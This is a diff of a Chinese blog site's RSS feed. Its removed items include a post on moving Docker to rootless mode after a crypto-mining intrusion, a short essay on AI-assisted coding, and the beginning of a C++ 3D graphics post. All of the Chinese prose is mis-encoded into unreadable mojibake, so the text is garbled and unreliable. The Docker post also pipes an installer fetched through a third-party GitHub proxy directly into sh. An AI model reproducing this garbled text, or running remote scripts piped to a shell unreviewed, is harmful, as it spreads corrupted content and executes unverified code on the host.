@@ -3,231 +3,12 @@
     <channel>
         <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
         <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
-        <lastBuildDate>2026-02-20T13:15:28.895Z</lastBuildDate>
+        <lastBuildDate>2026-02-20T16:33:11.338Z</lastBuildDate>
         <description><![CDATA[
         ä¸»é¡µ - åå®¢å­ RSS
     ]]></description>
         <language>zh-cn</language>
         <item>
-    <title><![CDATA[ ä»æç¿æ¨é©¬å¥ä¾µå° Docker Rootless å åºï¼æçæå¡å¨å®å¨å¤ç ]]></title>
-    <link>https://www.cnblogs.com/deali/p/19626849</link>
-    <guid>bad83b26ce1d20632b52ac7719ac2f40</guid>
-    <description>
-    <![CDATA[ 
-            <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/deali/p/19626849" title="åå¸äº 2026-02-20 20:45">
-    <span role="heading" aria-level="2">ä»æç¿æ¨é©¬å¥ä¾µå° Docker Rootless å åºï¼æçæå¡å¨å®å¨å¤ç</span>
-    
-
-</a>
-
-            </h1>
-            <div class="clear"></div>
-            <div class="postBody">
-                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<h2 id="åè¨">åè¨</h2>
-<p>æè¿æè¿ç»­å å°æå¡å¨è¢«æäºæç¿æ¨é©¬ï¼CPUãå¸¦å®½ãç£ç IO è¢«ææ»¡ï¼æå¡å¨ç´æ¥å¡æ­»æ æ³è¿æ¥ã</p>
-<p>ææ¥ååç°ï¼æ ¸å¿è¯±å æ¯ Docker æéè¿é« + æå¡æ¼æ´æ´é²ï¼å¯¼è´æ»å»èéè¿å®¹å¨çªç ´æéæ§å¶ã</p>
-<p><img src="https://blog.deali.cn/media/blog/cec878553480eb4f/1097027d157aa49e.jpg" alt="" loading="lazy"></p>
-<blockquote>
-<p>PSï¼æ¬æ¥æ³åä¸ç¯æç« ä»ç»ææ¥è¿ç¨çï¼ä¸è¿è¿æ¯å«éº»ç¦æ²¡åï¼æ¾å¨æ¬æä¸èµ·è®²å§~</p>
-</blockquote>
-<p>éè£ç³»ç»åï¼æå¨é¨ç½² Docker æ¶æ³¨æå°å®æ¹æç¤ºç Rootlessï¼æ æ ¹ï¼æ¨¡å¼ ââ è¿ä¸æ¨¡å¼è½ä»æ ¹æ¬ä¸éä½å®¹å¨éé¸é£é©ï¼éæ·±å¥ç ç©¶å¹¶è½å°éç½®ï¼ç°å°å®æ´è¿ç¨æ´çåäº«ï¼å¸æè½å¸®å°åæ ·å³æ³¨ Docker å®å¨çå¼åèã</p>
-<h2 id="rootless-æ¨¡å¼æ¯ä»ä¹">Rootless æ¨¡å¼æ¯ä»ä¹</h2>
-<p>æ®éæåµä¸ï¼Docker å®æ¤è¿ç¨ï¼dockerdï¼æ¯ç¨ <code>root</code> æéè¿è¡çï¼åªæä½ ç¨æ®éç¨æ·æ§è¡ <code>docker run</code>ï¼åºå±è¿æ¯ root æéï¼è¿æå®å¨é£é©ï¼æ¯å¦å®¹å¨éé¸å¯è½æ¿å°ä¸»æº rootï¼ã</p>
-<p>Rootless æ¨¡å¼è®© Docker å®æ¤è¿ç¨ä»¥<strong>æ®éç¨æ·æé</strong>è¿è¡ï¼åªæå®¹å¨åºé®é¢ï¼ä¹æ æ³è·åä¸»æºç root æéï¼å®å¨æ§å¤§å¹æåã</p>
-<p>æå¥½å¤èªç¶æä»£ä»·ï¼rootless çä»£ä»·æ¯éç½®å¤æï¼ä¸é¨ååè½åéï¼æ¯å¦æ æ³ç«¯å£æ å° &lt; 1024ï¼ã</p>
-<p>ä¸è¿æ²¡å³ç³»ï¼è¿äºä¹å¯ä»¥éè¿éç½®è§£å³ãåä»å®è£å¼å§å§ã</p>
-<h2 id="å®è£docker">å®è£docker</h2>
-<p>æ¬æ¥å®è£æ¯å¾ç®åçï¼ä¸è¿å ä¸ªå®è¯­ï¼å¨å½åç½ç»ç¯å¢ï¼é£å°±éå¸¸å¤æäºã</p>
-<p>æ¬æä»ç»æç®åçå®è£æ¹å¼ï¼ä½¿ç¨dockerå®æ¹èæ¬+æ¸åéåã</p>
-<pre><code class="language-bash">export DOWNLOAD_URL="https://mirrors.tuna.tsinghua.edu.cn/docker-ce"
-# å¦æ¨ä½¿ç¨ curl
-curl -fsSL https://ghfast.top/https://raw.githubusercontent.com/docker/docker-install/master/install.sh | sh
-# å¦æ¨ä½¿ç¨ wget
-wget -O- https://ghfast.top/https://raw.githubusercontent.com/docker/docker-install/master/install.sh | sh
-</code></pre>
-<p>æ³¨æ <code>raw.githubusercontent.com</code> è¿ä¸ªååä¹æ¯æ æ³è®¿é®çï¼å¯ä»¥ä½¿ç¨ ghproxy æ¥å éã</p>
-<h2 id="å®è£å®ææç¤º">å®è£å®ææç¤º</h2>
-<p>å®è£å®æä¼æä¸ä¸ªæç¤ºï¼è¿ä¹æ¯å¼å¯ Rootless æ¨¡å¼çå³é®å¥å£ï¼</p>
-<pre><code class="language-bash">================================================================================
-
-To run Docker as a non-privileged user, consider setting up the
-Docker daemon in rootless mode for your user:
-
-    dockerd-rootless-setuptool.sh install
-
-Visit https://docs.docker.com/go/rootless/ to learn about rootless mode.
-
-
-To run the Docker daemon as a fully privileged service, but granting non-root
-users access, refer to https://docs.docker.com/go/daemon-access/
-
-WARNING: Access to the remote API on a privileged Docker daemon is equivalent
-         to root access on the host. Refer to the 'Docker daemon attack surface'
-         documentation for details: https://docs.docker.com/go/attack-surface/
-
-================================================================================
-</code></pre>
-<p>æå°±æ¯å¨è¿éå¼å§ä½¿ç¨ rootless æ¨¡å¼çã</p>
-<p>æç¤ºæ ¸å¿è§£è¯»ï¼</p>
-<ol>
-<li>æ¨èéè¿<code>dockerd-rootless-setuptool.sh install</code>å¼å¯ Rootless æ¨¡å¼ï¼è®©æ®éç¨æ·æ  root æéè¿è¡ Dockerï¼</li>
-<li>è¥åæ root æéè¿è¡ Dockerï¼å¯åèææ¡£ç»æ®éç¨æ·ææï¼å¦å å¥ docker ç»ï¼ï¼ä½é£é©æ´é«ï¼</li>
-<li>éç¹è­¦åï¼æ´é² Docker è¿ç¨ APIï¼å¦ 2375 ç«¯å£ï¼= ç´æ¥å¼æ¾ä¸»æº root æéï¼è¿æ¯æå¡å¨è¢«å¥ä¾µçé«é¢è¯±å ï¼</li>
-</ol>
-<h2 id="å®è£å¿è¦ä¾èµ">å®è£å¿è¦ä¾èµ</h2>
-<p>æç´æ¥è¿è¡ <code>dockerd-rootless-setuptool.sh install</code> çæ¶åï¼æç¤ºè¦ç¼ºä¹ä¾èµ</p>
-<pre><code class="language-bash">$ dockerd-rootless-setuptool.sh install
-[ERROR] Missing system requirements. Run the following commands to
-[ERROR] install the requirements and run this tool again.
-
-########## BEGIN ##########
-sudo sh -eux &lt;&lt;EOF
-# Install newuidmap &amp; newgidmap binaries
-apt-get install -y uidmap
-EOF
-########## END ##########
-</code></pre>
-<p>è¾å¥æç¤ºçè¿è¡å½ä»¤ï¼</p>
-<pre><code class="language-bash">sudo sh -eux &lt;&lt;EOF
-# Install newuidmap &amp; newgidmap binaries
-apt-get install -y uidmap
-EOF
-</code></pre>
-<p>å®è£å®æåï¼åæ¬¡æ§è¡ <code>dockerd-rootless-setuptool.sh install</code></p>
-<p>ä»¥åæä½ docker æå¡ï¼è¦å ä¸ <code>--user</code></p>
-<pre><code class="language-bash">systemctl --user start docker.service
-</code></pre>
-<h2 id="éç½®">éç½®</h2>
-<p>rootless æ¨¡å¼ä¸ï¼</p>
-<ul>
-<li>ææ Docker å½ä»¤é½è¦å¨<strong>å®è£ Rootless çæ®éç¨æ·</strong>ä¸æ§è¡ï¼ä¸è¦ç¨ rootï¼ï¼</li>
-<li>å¦æéå¯æå¡å¨å Docker æ²¡èªå¨å¯å¨ï¼æ§è¡ï¼<code>systemctl --user enable --now docker</code>ï¼</li>
-<li>æ°æ®å¤ä»½è¦æ¾ <code>~/.local/share/docker</code> ç®å½ï¼èé <code>/var/lib/docker</code>ï¼ã</li>
-</ul>
-<h3 id="éåå éå¨">éåå éå¨</h3>
-<p>é»è®¤æåµä¸ï¼Rootless Docker çéç½®æä»¶å­æ¾å¨å½åç¨æ·ç <strong>XDG éç½®ç®å½</strong> ä¸ï¼è·¯å¾æ¯ï¼<code>~/.config/docker/daemon.json</code></p>
-<pre><code class="language-bash"># ååå»ºç®å½ï¼å¦æä¸å­å¨ï¼
-mkdir -p ~/.config/docker
-
-# ç¼è¾éç½®æä»¶ï¼ç¨ nano æ vim é½å¯ä»¥ï¼
-nano ~/.config/docker/daemon.json
-</code></pre>
-<p>éç½®å éå¨</p>
-<pre><code class="language-json">{
-  "registry-mirrors": ["https://ä½ çé¿éäºéåå éå°å.mirror.aliyuncs.com"],
-  "log-driver": "json-file",
-  "log-opts": {
-    "max-size": "100m",
-    "max-file": "3"
-  }
-}
-</code></pre>
-<p>æ³¨æï¼ä¹åå¤§é¨åç¨³å®å¥½ç¨çå éå¨é½åæ­¢æå¡äºï¼ç°å¨å°±æ²¡æ³æ¨èå¥ï¼å¤§å®¶åå­æ¬äºå§ã</p>
-<h3 id="è§£å³-æ æ³ç»å®-1-1023-ç«¯å£-çé®é¢">è§£å³ âæ æ³ç»å® 1-1023 ç«¯å£â çé®é¢</h3>
-<p>éè¦ç»å½åç¨æ· âç»å®ä½ç«¯å£â çæéï¼</p>
-<pre><code class="language-bash"># ç»å½åç¨æ·ææç»å® 1-1023 ç«¯å£ï¼ä»å¯¹å½åä¼è¯çæï¼
-sudo sysctl net.ipv4.ip_unprivileged_port_start=0
-
-# æ°¸ä¹çæï¼éå¯åä¹ææï¼
-echo "net.ipv4.ip_unprivileged_port_start=0" | sudo tee -a /etc/sysctl.conf
-sudo sysctl -p  # ç«å³çæ
-</code></pre>
-<p>æ§è¡åï¼ä½ å°±è½æ­£å¸¸æ å° 80ã443 ç­ç«¯å£äºã</p>
-<h3 id="éå¯çæ">éå¯çæ</h3>
-<p>Rootless æ¨¡å¼ç Docker éå¯å½ä»¤åç³»ç»çº§ä¸åï¼æ§è¡ï¼</p>
-<pre><code class="language-bash"># éå¯å½åç¨æ·ç Docker æå¡
-systemctl --user restart docker
-
-# éªè¯éç½®æ¯å¦çæ
-docker info
-# è½å¨ "Registry Mirrors" é¨åçå°ä½ éç½®çéåå éå°åå°±æ¯æåç
-</code></pre>
-<p>æ­£å¸¸è¾åºç¤ºä¾ï¼</p>
-<pre><code class="language-plaintext">Rootless: true
-Registry Mirrors:
- https://ä½ çé¿éäºéåå éå°å.mirror.aliyuncs.com/
-</code></pre>
-<h3 id="rootless-æ¨¡å¼ä¸æ¯æçéç½®é¡¹">Rootless æ¨¡å¼ä¸æ¯æçéç½®é¡¹</h3>
-<p>é¨åç³»ç»çº§éç½®å¨ Rootless ä¸æ æï¼å ä¸ºæ²¡æ root æéï¼ï¼æ¯å¦ï¼</p>
-<ul>
-<li><code>iptables: false</code>ï¼ç½ç»è§åç± slirp4netns ç®¡çï¼èé iptablesï¼ï¼</li>
-<li><code>storage-driver: overlay2</code>ï¼é»è®¤å·²å¯ç¨ï¼æ éæå¨éç½®ï¼ï¼</li>
-<li>è¿ç¨ API ç¸å³éç½®ï¼å¦ <code>hosts: ["tcp://0.0.0.0:2375"]</code>ï¼Rootless ä¸ä¸å»ºè®®å¼å¯ï¼ã</li>
-<li>ä»»ä½æ¶åç³»ç»çº§ç®å½ï¼å¦<code>/var/run/docker.sock</code>ï¼çéç½®ã</li>
-</ul>
-<h2 id="volumeé®é¢">volumeé®é¢</h2>
-<p>åæ¢å° rootless ä¹åï¼æè¿åç°äº swag ç config æ æ³è¯»åäºã</p>
-<p>swag ç compose.yaml éç½®æ¯è¿æ ·ï¼</p>
-<pre><code class="language-yaml">services:
-  swag:
-    image: linuxserver/swag
-    container_name: swag
-    cap_add:
-      - NET_ADMIN
-    environment:
-      - PUID=1000
-      - PGID=1000
-    volumes:
-      - ./config:/config
-</code></pre>
-<p><strong>rootless Docker éï¼å®¹å¨åç UID=1000 â  å®¿ä¸»æºç UID=1000</strong></p>
-<p>æä»¥ <strong>SWAG å¨å®¹å¨é chown äº <code>/config</code>ï¼å®¿ä¸»æºçå°çæ¯ä¸ä¸ªâæ å°åçéç UIDï¼100999ï¼â</strong></p>
-<h3 id="è§£å³æ¹æ³">è§£å³æ¹æ³</h3>
-<p>rootless å®æ¹æ¨èä½¿ç¨å½åå·ï¼ä½æè¦ç»å¸¸ä¿®æ¹ config éçæä»¶ï¼è¿ä¸ªè¯å®ä¸ç°å®ã</p>
-<p>é£ä¹è¿æä¸ä¸ªæ¹æ³ï¼ä½¿ç¨ ACL æ¾è¡ã</p>
-<p>åå®è£ç¸å³å·¥å·ï¼</p>
-<pre><code class="language-bash">sudo apt update
-sudo apt install -y acl
-</code></pre>
-<p>å¨ swag ç®å½ä¸æ§è¡</p>
-<pre><code class="language-bash">setfacl -m u:ecs-user:rwx config
-setfacl -R -m u:ecs-user:rwx config
-setfacl -d -m u:ecs-user:rwx config
-</code></pre>
-<p>éªè¯ï¼</p>
-<pre><code class="language-bash">getfacl config | sed -n '1,20p'
-</code></pre>
-<p>çå°ç±»ä¼¼ï¼</p>
-<pre><code>user::rwx
-user:ecs-user:rwx
-group::r-x
-mask::rwx
-other::r-x
-</code></pre>
-<h2 id="å°ç»">å°ç»</h2>
-<p>Rootless æ¨¡å¼è½æ¯æ®é Docker éç½®ç¨ç¹çï¼ä½è½ä»æ ¹æ¬ä¸éä½å®¹å¨éé¸é£é©ï¼å°¤å¶éåå¯¹å¤æä¾æå¡ççäº§æå¡å¨ãæ ¸å¿æ»ç»ï¼</p>
-<ol>
-<li>å®è£ï¼ç»åæ¸åéåæºè§£å³å½åä¸è½½é®é¢ï¼ä¼åç¨æ®éç¨æ·å®è£ Rootless æ¨¡å¼ï¼</li>
-<li>æéï¼ç¦æ­¢æ´é² Docker è¿ç¨ APIï¼ç»æ®éç¨æ·ææä½ç«¯å£ç»å®æéå³å¯æ»¡è¶³æ¥å¸¸ä½¿ç¨ï¼</li>
-<li>éç½®ï¼ç¢è®° Rootless æ¨¡å¼çéç½®æä»¶ãæ°æ®ç®å½åå¨ç¨æ·ç®å½ä¸ï¼ä¸ç³»ç»çº§ Docker åºåå¼ï¼</li>
-<li>å®å¨ï¼å³ä¾¿å¼å¯ Rootlessï¼è¿è¡å®¹å¨æ¶ä»éæ³¨ææå¡å®å¨ï¼å¦ Redis å å¯ç ãå®å¨ç»éå¶ç«¯å£è®¿é®ï¼ã</li>
-</ol>
-<p>æ­¤æ¬¡è¸©åè®©ææ·±å»æè¯å°ï¼æå¡å¨å®å¨æ å°äºï¼åªææ¯ Docker è¿æ ·çåºç¡å·¥å·ï¼ä¹éä»æéå±é¢åå¥½æå°åç®¡æ§ï¼æè½é¿åè¢«æç¿æ¨é©¬ç­æ¶æç¨åºè¶èèå¥ã</p>
-
-
-</div>
-<div id="MySignature" role="contentinfo">
-    å¾®ä¿¡å¬ä¼å·ï¼ãç¨åºè®¾è®¡å®éªå®¤ã
-ä¸æ³¨äºäºèç½ç­é¨æ°ææ¯æ¢ç´¢ä¸å¢éææ·å¼åå®è·µï¼åæ¬æ¶æè®¾è®¡ãæºå¨å­¦ä¹ ä¸æ°æ®åæç®æ³ãç§»å¨ç«¯å¼åãLinuxãWebååç«¯å¼åç­ï¼æ¬¢è¿ä¸èµ·æ¢è®¨ææ¯ï¼åäº«å­¦ä¹ å®è·µç»éªã
-</div>
-<div class="clear"></div>
-
-            </div>
-            <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-20 20:46">2026-02-20 20:45</span>&nbsp;
-<a href="https://www.cnblogs.com/deali">ç¨åºè®¾è®¡å®éªå®¤</a>&nbsp;
-éè¯»(<span id="post_view_count">0</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
-&nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(19626849);return false;">æ¶è</a>&nbsp;
-<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19626849', targetLink: 'https://www.cnblogs.com/deali/p/19626849', title: 'ä»æç¿æ¨é©¬å¥ä¾µå° Docker Rootless å åºï¼æçæå¡å¨å®å¨å¤ç' })">ä¸¾æ¥</a>
-</div>
-         ]]>
-    </description>
-    </item>
-<item>
     <title><![CDATA[ æ¨¡æéç«ç®æ³ ]]></title>
     <link>https://www.cnblogs.com/PaperPlaneFly/p/19626799</link>
     <guid>044d6b7c4716bcb5b1b33ef6890a5c68</guid>
@@ -673,7 +454,7 @@ namespace sa::detail {
             <div class="postDesc">posted @ 
 <span id="post-date" data-last-update-days="0.008333333333333333" data-date-updated="2026-02-20 20:26">2026-02-20 20:14</span>&nbsp;
 <a href="https://www.cnblogs.com/PaperPlaneFly">çº¸é£æºä½ç©ºé£è¡</a>&nbsp;
-éè¯»(<span id="post_view_count">1</span>)&nbsp;
+éè¯»(<span id="post_view_count">28</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(19626799);return false;">æ¶è</a>&nbsp;
@@ -940,267 +721,13 @@ settings.json(æ ¹æ®èªå·±çè·¯å¾éç½®)</p>
             <div class="postDesc">posted @ 
 <span id="post-date" data-last-update-days="0.004166666666666667" data-date-updated="2026-02-20 19:37">2026-02-20 19:31</span>&nbsp;
 <a href="https://www.cnblogs.com/chenyouyuan">ChenYY~</a>&nbsp;
-éè¯»(<span id="post_view_count">8</span>)&nbsp;
+éè¯»(<span id="post_view_count">42</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(19626759);return false;">æ¶è</a>&nbsp;
 <a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19626759', targetLink: 'https://www.cnblogs.com/chenyouyuan/p/19626759', title: 'ææææä½ ä½¿ç¨vscodeå¼åstm32ï¼' })">ä¸¾æ¥</a>
 </div>
          ]]>
-    </description>
-    </item>
-<item>
-    <title><![CDATA[ âèä¸è¥¿ï¼ä½ æ¦å¼±äºâââå³äºVibe Codingä¸ä¼ ç»å¼å ]]></title>
-    <link>https://www.cnblogs.com/SilverGo/p/19626693</link>
-    <guid>34a9d8c948cd55d1615231e85362895d</guid>
-    <description>
-    <![CDATA[ 
-            <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/SilverGo/p/19626693" title="åå¸äº 2026-02-20 17:51">
-    <span role="heading" aria-level="2">âèä¸è¥¿ï¼ä½ æ¦å¼±äºâââå³äºVibe Codingä¸ä¼ ç»å¼å</span>
-    
-
-</a>
-
-            </h1>
-            <div class="clear"></div>
-            <div class="postBody">
-                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<h1 id="åè¨">åè¨</h1>
-<p>éäººå¨æ¨å¤©å·è§é¢çæ¶åï¼æå¤å·å°äºè¿æ ·çä¸ä¸ªvideoï¼<br>
-ä¸å¹æ¢å¾ï¼åä¸¾äº2025å¹´å2023å¹´çä¸¤å¥å¼åå·¥å·ï¼<br>
-2025å¹´ï¼æä»¬ç¨TRAEãClaudeãCopilotãWindows 11ï¼<br>
-2023å¹´ï¼æä»¬ç¨ClionãIDEAãVimãEmacsãperfãlldbãgdbãLinuxã<br>
-ææ¡æ¯ï¼âèä¸è¥¿ï¼ä½ æ¦å¼±äºï¼â</p>
-<h1 id="_"></h1>
-<p>ä»æçæ¥è®²ï¼æ¯«æ çé®ï¼2025å¹´çè¿ä¸å¥å·¥å·ä¸ä»å¼åæçå¤§å¹ä¸æ¶¨ï¼æ¶é´ææ¬éä½ï¼ä»å·¥å·æ¬èº«èè¨ï¼å¶ææ¯é¾åº¦ä¹ä¸æ¶¨äºã<br>
-ä½æ¯ï¼ä»ç¨åºåçè§åº¦èè¨ï¼æä»¬ä¸§å¤±äºå¯¹åºå±çææ§ï¼<br>
-2025å¹´ï¼å¨å¨å´ï¼ä»ä¹é½è§£å³äºã<br>
-2023å¹´ï¼ä¸åé½è¦èªå·±å¨æã<br>
-2025å¹´çæä»¬ï¼ä¸åæçè³ä¸ï¼æä»¬å©ç¨AIï¼å°åäºå¾å¤åæ¥éè¦èªå·±åçä»£ç ï¼<br>
-å¯æä»¬é¾éä¸åºè¯¥æ³æ³ï¼è¿ççå¯¹åï¼</p>
-<p>æä»¬åºè¯¥é®èªå·±ï¼å½åä¸ºä»ä¹åæ¬¢CSï¼<br>
-ä¸å°±æ¯å ä¸ºCSæ¬èº«çèªç±ãè§£æä¸å»ºæåï¼<br>
-æä»¬éæ©AIæ¿æä»¬åä»£ç ï¼æ¯ä¸ç§å°æªæ¥äº¤ç»é»ççè¡ä¸ºã<br>
-ä¸æ¦åºç°äºéèçãAIæ¹ä¸åºæ¥çéè¯¯ï¼è¿äºé¿æä½¿ç¨AIçâç¨åºåâå°ç´æ¥å»ç¼ã<br>
-ç¨åºåæç»æ¯è¦é ä»£ç å»ºæä¸ççï¼èä¸æ¯PUA Agentçã</p>
-<p>ä½æ¯å®å¨æå¼AIä¹æ¯ä¸ç°å®çï¼é£ä¹æä¹æè¡¡å¢ï¼<br>
-ä»¥ä¸æ¯éäººçæè§ï¼<br>
-1.å°AIå½ä½ä¸ä¸ªé«çº§çæå<br>
-2.æ ¸å¿ä»£ç å¿é¡»èªå·±å<br>
-3.éå¤æ§çä»£ç ï¼æ¯å¦è¡¥å¨æä¸ªswitchï¼å¯ä»¥ä½¿ç¨AI<br>
-4.æ¶æè®¨è®ºå¯ä»¥ä½¿ç¨AI</p>
-<h1 id="ç»è¯­">ç»è¯­</h1>
-<p>è¿ç¯æç« éå¸¸ç­ï¼èä¸å ä¸ºæ¶é´åå ï¼åçæ¯è¾ä»ä¿ï¼ä½æ¯ææå°äºå³å¯<br>
-å¨ç°å¨çAIæ¶ä»£ï¼æä»¬è¿½æ±æçè³ä¸ï¼ä½æ¯æä»¬æ´åºè¯¥æææ¬å¿ãåå®åå¿<br>
-é¿æå®å¨ä¾èµAIåªä¼åå¼±èªå·±çè½åï¼å¦ææ³°æ¥ãç©æå¿åï¼è¿æ¯å¿ç¶ç<br>
-äºè§£åºå±ãå¨æ²¡æAIçæåµä¸ç§æ ·è½å¤ååºå®ç¾çä»£ç ï¼è¿ææ¯ç¨åºåæ°´å¹³é«çè¡¨ç°<br>
-è°¢è°¢éè¯»</p>
-
-
-</div>
-<div class="clear"></div>
-
-            </div>
-            <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-20 17:51">2026-02-20 17:51</span>&nbsp;
-<a href="https://www.cnblogs.com/SilverGo">Ghost-Face</a>&nbsp;
-éè¯»(<span id="post_view_count">2</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
-&nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(19626693);return false;">æ¶è</a>&nbsp;
-<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19626693', targetLink: 'https://www.cnblogs.com/SilverGo/p/19626693', title: 'âèä¸è¥¿ï¼ä½ æ¦å¼±äºâââå³äºVibe Codingä¸ä¼ ç»å¼å' })">ä¸¾æ¥</a>
-</div>
-         ]]>
-    </description>
-    </item>
-<item>
-    <title><![CDATA[ å°ä»£ç ï¼å¤§è§éï¼è¯ä¸ä¸ªå¸åçâæ°å­¦å¯è§å + è®¡ç®æºå¾å½¢å­¦å¥é¨âçä¼ç§æ¡ä¾(C++ç²¾çµåº3Dæ¡ä¾) ]]></title>
-    <link>https://www.cnblogs.com/lixingqiu/p/19626608</link>
-    <guid>43f5fa110c14ff50e9edf9dfcfd2a71c</guid>
-    <description>
-    <![CDATA[ 
-	<h1 class="postTitle"><a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/lixingqiu/p/19626608" title="åå¸äº 2026-02-20 16:43">
-    <span role="heading" aria-level="2">å°ä»£ç ï¼å¤§è§éï¼è¯ä¸ä¸ªå¸åçâæ°å­¦å¯è§å + è®¡ç®æºå¾å½¢å­¦å¥é¨âçä¼ç§æ¡ä¾(C++ç²¾çµåº3Dæ¡ä¾)</span>
-    
-
-</a>
-</h1>
-	<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
-<p><span data-cke-copybin-start="1"><span data-cke-copybin-start="1">âçè§é¢å¨è¿éï¼https://www.douyin.com/video/7608839461102734592</span></span></p>
-<p><span data-cke-copybin-start="1"><span data-cke-copybin-start="1">ç¨åºä»£ç å¨æä¸é¢ã</span></span></p>
-<p><span id="cke_bm_12069S">&nbsp;</span><span id="cke_bm_12069S">è¿ä»½ä»£ç åè§é¢å±ç¤ºäºä¸ä¸ªéå¸¸å¸åçâæ°å­¦å¯è§å + è®¡ç®æºå¾å½¢å­¦å¥é¨âçä¼ç§æ¡ä¾ãå®ä¸ä»ä»æ¯ä¸æ®µè½è¿è¡çä»£ç ï¼æ´æ¯ä¸ä¸ªå°æ½è±¡æ°å­¦å¬å¼è½¬åä¸ºç´è§è§è§èºæ¯çæå­¦æ¼ç¤ºã</span></p>
-<p><em id="__mceDel"><span id="cke_bm_12069S"> ä»¥ä¸æ¯å¯¹è¯¥ç¨åºåè§é¢çå¤ç»´åº¦è¯è®ºï¼</span></em></p>
-<h2>1. ææ¯å®ç°ä¸å¾å½¢å­¦åç</h2>
-<p>è¿æ®µä»£ç è½ç¶ç®ç­ï¼ä½å®æ´å®ç°äºä¸ä¸ªå¾®å3D æ¸²æç®¡çº¿çæ ¸å¿é»è¾ï¼è¿å¯¹äº C++ åå­¦èæ¥è¯´éå¸¸æä»·å¼ï¼åæ°åæ²é¢å»ºæ¨¡ï¼<br>
-ä»£ç æ ¸å¿å¨äºé£ä¸è¡åæ è®¡ç®å¬å¼ï¼</p>
-<div class="cke_widget_wrapper cke_widget_block cke_widget_codeSnippet cke_widget_selected" data-cke-display-name="ä»£ç æ®µ" data-cke-filter="off" data-cke-widget-id="7" data-cke-widget-wrapper="1">
-<pre class="cke_widget_element" data-cke-widget-data="%7B%22classes%22%3Anull%2C%22lang%22%3A%22cpp%22%2C%22code%22%3A%22p.x%20%3Da%20*%20cos(v)%20*%20sin(u)%3B%5Cnp.y%20%3Da%20*%20cos(u)%20*%20cos(v)%3B%5Cnp.z%20%3D%20-a%20*%20sin(v)%3B%22%7D" data-cke-widget-keep-attr="0" data-widget="codeSnippet"><code class="hljs language-cpp">p.x =a * <span class="hljs-built_in">cos(v) * <span class="hljs-built_in">sin(u);
-p.y =a * <span class="hljs-built_in">cos(u) * <span class="hljs-built_in">cos(v);
-p.z = -a * <span class="hljs-built_in">sin(v);</span></span></span></span></span></code></pre>
-<span class="cke_reset cke_widget_drag_handler_container"><img width="15" height="15" class="cke_reset cke_widget_drag_handler lazyload" title="ç¹å»å¹¶ææ½ä»¥ç§»å¨" data-cke-widget-drag-handler="1" data-src="https://img2024.cnblogs.com/blog/523461/202602/523461-20260220164341919-1115310452.gif"></span></div>
-<p>å¶ä¸­a=uãè¿æ¯ä¸ä¸ªåæ°æ¹ç¨ï¼éè¿&nbsp;u å&nbsp;v ä¸¤ä¸ªåéçååçæä¸ç»´ç©ºé´ä¸­çç¹éãè§é¢å±ç¤ºçå½¢æç±»ä¼¼äºä¸ä¸ªèºææ²é¢æåå½¢çåé¥é¢ãè¿ç§å°æ°å­¦å¬å¼ç´æ¥æ å°ä¸ºå ä½å½¢ç¶çåæ³ï¼æ¯è®¡ç®æºå¾å½¢å­¦çåºç¡ã</p>
-<ul>
-<li>3D åæ¢ï¼æè½¬ï¼ï¼</li>
-</ul>
-<p>rotateY å½æ°å®ç°äºæ åçæè½¬ç©éµè¿ç®ãéè¿æ¯ä¸å¸§å¢å  rotate_angleï¼å®ç°äºç©ä½ç» Y è½´çè¿ç»­æè½¬å¨ç»ãè¿æ¯çè§£ 3D ç©ºé´åæ¢æç´è§çæ¹å¼ã</p>
-<ul>
-<li>éè§æå½±ï¼Perspective Projectionï¼ï¼</li>
-</ul>
-<p>project å½æ°ä¸­ double factor = scale / (2.0 + p.z); æ¯ç¹çä¹ç¬ãå®æ¨¡æäºäººç¼âè¿å¤§è¿å°âçè§è§ææãå¦ææ²¡æè¿ä¸è¡ï¼ç©ä½æè½¬æ¶çèµ·æ¥ä¼æ¯å¹³é¢çï¼å ä¸è¿ä¸è¡åï¼Z è½´çæ·±åº¦æç«å»æ¾ç°åºæ¥ã</p>
-<ul>
-<li>åç¼å²ææ¯ï¼</li>
-</ul>
-<p>screen.tracer(0) å screen.update() çéåä½¿ç¨ï¼æå³çç¨åºéç¨äºåç¼å²æºå¶ãåå¨åç¼å²åºç»å¶å®ææç¹ï¼åä¸æ¬¡æ§æ¾ç¤ºå°å±å¹ãè¿ææé¿åäºç»é¢ç»å¶è¿ç¨ä¸­çéªçï¼ä¿è¯äºå¨ç»çæµçæ§ã</p>
-<h2>2. è§è§ææä¸ç¾å­¦</h2>
-<p>&nbsp;</p>
-<ul>
-<li>ç¹äºé£æ ¼ï¼Point Cloudï¼ï¼</li>
-</ul>
